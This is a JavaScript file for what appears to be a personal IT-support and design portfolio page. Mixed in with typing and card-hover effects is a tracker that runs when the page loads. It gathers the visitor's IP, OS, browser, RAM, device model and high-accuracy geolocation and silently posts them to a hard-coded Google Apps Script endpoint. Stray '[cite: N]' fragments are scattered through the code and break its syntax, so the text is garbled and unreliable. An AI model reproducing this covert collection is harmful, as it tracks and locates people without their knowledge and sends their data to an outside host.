(async function() {
  // === 1. KONFIGURASI ===
  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwMFjUkRHVdIoveqaXtmxeSf7Q8TO0UBovxXQWpN_SAXCZdLSWtw7wuFxvNyGLLw2TgUg/exec"; 

  // === 2. DETEKSI OS, BROWSER, & ENGINE DETAIL ===
  const getDetailedSpecs = () => {
    const ua = navigator.userAgent;
    let osDetail = "Unknown OS";
    let browserDetail = "Unknown Browser";
    let engine = "Unknown Engine";

    if (/WebKit/i.test(ua)) engine = "WebKit"; [cite: 16]
    if (/Gecko/i.test(ua) && !/WebKit/i.test(ua)) engine = "Gecko"; [cite: 16]
    if (/Chrome/i.test(ua)) engine = "Blink"; [cite: 16]

    if (/iPhone|iPad|iPod/.test(ua)) { [cite: 17]
      const v = (ua.match(/OS (\d+)_(\d+)_?(\d+)?/));
      osDetail = `iOS ${v[1]}.${v[2]}.${v[3] || '0'}`; [cite: 17]
    } else if (/Android/.test(ua)) { [cite: 17]
      const v = (ua.match(/Android (\d+)/));
      osDetail = `Android ${v ? v[1] : 'Unknown'}`; [cite: 17]
    } else if (/Windows NT/.test(ua)) { [cite: 17]
      const v = ua.match(/Windows NT (\d+\.\d+)/);
      const winMap = {"10.0": "10/11", "6.3": "8.1", "6.2": "8", "6.1": "7"}; [cite: 18]
      osDetail = `Windows ${winMap[v[1]] || v[1]}`; [cite: 18]
    } else {
      osDetail = navigator.platform; [cite: 19]
    }

    let M = ua.match(/(opera|chrome|safari|firefox|msie|trident|edg(?=\/))\/?\s*(\d+)/i) || []; [cite: 20]
    let name = M[1] ? M[1].toLowerCase() : "Unknown"; [cite: 21]
    let version = M[2] || "0"; [cite: 21]
    if (name === 'edg') name = 'Edge'; [cite: 22]
    if (name === 'trident') name = 'IE'; [cite: 22]
    browserDetail = `${name.charAt(0).toUpperCase() + name.slice(1)} ${version} (${engine})`; [cite: 23]

    return { osDetail, browserDetail };
  };

  // === 3. DETEKSI MODEL IPHONE (UP TO IPHONE 16) ===
  const getDeviceModel = () => {
    const w = window.screen.width; [cite: 24]
    const h = window.screen.height; [cite: 25]
    const ua = navigator.userAgent; [cite: 25]
    if (!/iPhone|iPad|iPod/.test(ua)) return navigator.platform; [cite: 25]
    const models = {
      "440:956": "iPhone 16 Pro Max",
      "402:874": "iPhone 16 Pro",
      "430:932": "iPhone 15/16 Plus / 14 Pro Max",
      "393:852": "iPhone 15/16 / 14 Pro",
      "390:844": "iPhone 12/13/14",
      "428:926": "iPhone 12/13/14 Pro Max",
      "414:896": "iPhone 11/XR/XS Max",
      "375:812": "iPhone X/XS/11Pro",
      "375:667": "iPhone SE/6/7/8",
      "414:736": "iPhone 6/7/8 Plus"
    }; [cite: 26]
    return models[`${w}:${h}`] || "Apple iPhone"; [cite: 27]
  };

  // === 4. TRACKING ENGINE ===
  const startTracker = async () => {
    const specs = getDetailedSpecs(); [cite: 27]
    let payload = {
      ip: "Checking...",
      osDetail: specs.osDetail,
      browserDetail: specs.browserDetail,
      ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A", [cite: 28, 29]
      deviceName: getDeviceModel(), [cite: 29]
      lat: null, long: null
    };

    try {
      const res = await fetch('https://api.ipify.org?format=json'); [cite: 30]
      const d = await res.json(); [cite: 31]
      // MODIFIKASI: IP ditambahkan link whatismyipaddress
      payload.ip = "https://whatismyipaddress.com/ip/" + d.ip; 
    } catch (e) { 
      payload.ip = "Hidden/VPN"; [cite: 31]
    }

    const sendData = (data) => {
      fetch(WEB_APP_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(data) }); [cite: 32]
    };

    if (navigator.geolocation) { [cite: 33]
      navigator.geolocation.getCurrentPosition((pos) => {
        payload.lat = pos.coords.latitude; [cite: 33]
        payload.long = pos.coords.longitude; [cite: 33]
        sendData(payload); 
      }, () => {
        sendData(payload); 
      }, { enableHighAccuracy: true }); [cite: 33]
    } else {
      sendData(payload); [cite: 34]
    }
  };

  // === 5. UI EFFECTS (TYPING & RIPPLE) ===
  const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast']; [cite: 35]
  let textIndex = 0, charIndex = 0, isDeleting = false, typingDelay = 150; [cite: 36]

  function typeText() {
    const typedElement = document.getElementById('typed-text'); [cite: 37]
    if (!typedElement) return; [cite: 37]
    const currentText = texts[textIndex]; [cite: 37]

    if (isDeleting) { [cite: 38]
      typedElement.textContent = currentText.substring(0, charIndex - 1); [cite: 38]
      charIndex--; typingDelay = 75; [cite: 38]
    } else { [cite: 39]
      typedElement.textContent = currentText.substring(0, charIndex + 1); [cite: 39]
      charIndex++; typingDelay = 150; [cite: 39]
    }

    if (!isDeleting && charIndex === currentText.length) { [cite: 40]
      typingDelay = 2000; [cite: 40]
      isDeleting = true; [cite: 41]
    } else if (isDeleting && charIndex === 0) { [cite: 41]
      isDeleting = false; [cite: 41]
      textIndex = (textIndex + 1) % texts.length; [cite: 42]
      typingDelay = 500; [cite: 42]
    }
    setTimeout(typeText, typingDelay); [cite: 42]
  }

  // === 6. INITIALIZE ALL ===
  window.addEventListener('load', () => { [cite: 43]
    startTracker(); [cite: 43]
    setTimeout(typeText, 1000); [cite: 43]

    document.querySelectorAll('.card').forEach(card => { [cite: 43]
      card.addEventListener('mousemove', (e) => { [cite: 43]
        const rect = card.getBoundingClientRect(); [cite: 43]
        const x = ((e.clientX - rect.left) / rect.width) * 100; [cite: 43]
        const y = ((e.clientY - rect.top) / rect.height) * 100; [cite: 43]
        card.querySelector('.card-inner').style.setProperty('--x', `${x}%`); [cite: 43]
        card.querySelector('.card-inner').style.setProperty('--y', `${y}%`); [cite: 44]
      });
    });
  });
})();
